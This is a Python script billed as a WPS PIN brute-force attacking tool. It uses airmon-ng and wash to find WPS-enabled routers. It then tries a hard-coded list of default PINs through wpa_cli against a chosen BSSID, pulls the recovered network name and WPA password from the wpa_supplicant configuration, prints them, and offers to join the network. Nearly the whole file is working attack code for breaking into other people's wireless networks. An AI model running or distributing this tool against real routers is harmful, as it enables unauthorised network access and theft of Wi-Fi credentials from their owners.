#!/usr/bin/python3
import os
import time
import shlex
import subprocess
from threading import Timer
from termcolor import colored

# WPA pin-brutforcing tools
# Default Pin list

default = ['86059688','15594594','40890296','12345670','96732311','73043898','00450904','76434617','66594437','73043881','NULLPIN','40890296','40890296','40890371','40890432','45864544','00000000','12345678']

# Banner graphics
def banner():
    wifipin = colored('Pin brutforce attacking tool','blue')
    wifi = colored ('WiFi','red')
    powered = colored('Sisay Sorsa','white')
    print (colored('''                                 /\\
                                /  \\
                _______________/꧁꧂  \\_________________''','yellow'))
    print ('                --------------------------------------')
    print ('''                ' %-5s-%-15s  '
                '           powered by :-%-10s '
                '------------------------------------' ''' % (wifi,wifipin,powered))

def check_dump():
    configPath = 'ctrl_interface=/var/run/wpa_supplicant'
    if os.path.exists('/etc/wpa_supplicant.conf'):
        dump = open('/etc/wpa_supplicant.conf','r')
        out = dump.read()
        if configPath in out:
            print ('\t[+] Dump-file is alredy configured [+]')
            dump = open('/etc/wpa_supplicant.conf','w')
            dump.write('ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1')
            dump.close()
            print ('\t      [+] Everyting in Order [+]')
        else:
            print ('\t[-]Dump-file is not configured [-]]')
            print ('\t\t[?] Configuring Dump-file ...')
            dump = open('/etc/wpa_supplicant.conf','w')
            dump.write('ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1')
            dump.close()
    else:
        print ('\t\t[-] Dump-file is not located [-]')
        print ('\t\t[?] Creating and Configuring Dump-file ...')
        try:
            dump = open('/etc/wpa_supplicant.conf','w')
            dump.write('ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1')
            dump.close()
            time.sleep(3)
            print ('\t\t[*] Created and Configured Successfuly[*]')
        except Exception as err:
            print ('\t[-] Failed to create due to : ',err)
            time.sleep(3)
def scanWiFi(scan_comm,timeout_sec):
    null_output = subprocess.getoutput('airmon-ng start wlan0')
    scan = subprocess.Popen(shlex.split(scan_comm),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    timer = Timer(timeout_sec,scan.kill)
    print (colored('\t\t\t[?] Scaning WiFi ...','yellow'))
    try:
        timer.start()
        scaned = scan.stdout.read()
        print (colored(scaned.decode(),'blue'))
        stdout,stderr=scan.communicate()
    except Exception as err:
        print ('\[-] Failed to scan WiFi due to : ',err)
    finally:
        print ('\t\t[+] Scan Complited Successfully [+]')
        timer.cancel()
        null_output2 = subprocess.getoutput('airmon-ng stop wlan0mon')
        
    
            
            
            
def defaultPin_brut(essid):
    os.system('pkill -f wpa_supplicant')
    out=subprocess.Popen('wpa_supplicant -Dwext -i wlan0 -c /etc/wpa_supplicant.conf -B',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    for pin in default:
        subprocess.getoutput('wpa_cli wps_reg %s %s' % (essid,pin))
        print ('\t[+] Injecting %s pin to %s BSSID ... ' % (pin,essid))
        time.sleep(5)
        dump = open('/etc/wpa_supplicant.conf','r')
        out = dump.read()
        if 'ssid' in out:
            print ('\t[+] Injected complited ')
            print ('\t\t      [+] Pin found %s [+]' % pin)
            global ssid
            global key
            Nul1,ssid = subprocess.getoutput("grep 'ssid' /etc/wpa_supplicant.conf").split('=')
            Nul2,key = subprocess.getoutput("grep 'psk' /etc/wpa_supplicant.conf").split('=')
            print (colored('\t============================================================','yellow'))
            print (colored('\t==        SSID     : %-15s                      ==' % ssid,'yellow'))
            print (colored('\t==        Password : %-15s                      ==' % key,'yellow'))
            print (colored('\t============================================================','yellow'))
            break
        else:
            print (colored('\t[-] Incorrect Pin ','red'))       
def reset_wlan0():
    os.system('pkill -f wpa_supplicant')
    os.system('ifconfig wlan0 down')
    while True:
        out = subprocess.getoutput('ifconfig')
        if 'wlan0' in out :
            os.system('ifconfig wlan0 up')
            print (colored('\t\t[?] Successfully reset wlan0 interface !!!','blue'))
            
            break
        else:
            os.system('ifconfig wlan0 up')
            time.sleep(3)
def connect_wifi(essid,password):
    os.system('service network-manager restart')
    while True:
        con_wifi =  str(input(colored('Do you want to connect ? [yes,no] :','white')))
        if con_wifi == 'yes':
            try:
                log_credential = ('nmcli d wifi connect %s password %s' % (essid,password))
                Null= subprocess.Popen(log_credential,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                time.sleep(5)
                print (colored('\t\t******{ Connected Successfully }******','white','on_grey'))
            except Exception as err:
                print (colored('\t\t-------{ Failed to Connect due to : %s }-------' % str(err),'white','on_red'))
            break
        elif con_wifi == 'no':
            print (colored('\t\t******{ Connection is not established }******','white','on_red'))
            break
        else :
            print (colored('Invalid input ','red'))
            continue
def lastValidation():
    dump = open('/etc/wpa_supplicant.conf','r')
    out = dump.read()
    dump.close()
    if 'ssid' in out:
        connect_wifi(ssid,key)
    else:
        print (colored('   ᪣ Sorry Pin is not found or the router is disable pin authentication ᪣   ','white','on_red'))
        
 
            

def main():
    os.system('clear')
    check_dump()
    time.sleep(3)
    os.system('clear')
    banner()
    scanWiFi('wash -i wlan0mon',5)
    #print ('\t\t\t [?]   VIP - Information   [?]')
    #print ('\t\t[+] airmon-ng check and kill all process befor starting [+]')
    essid = str(input('Enter BSSID : '))
    defaultPin_brut(essid)
    reset_wlan0()
    time.sleep(3)
    lastValidation()

main()


    
    
    
    
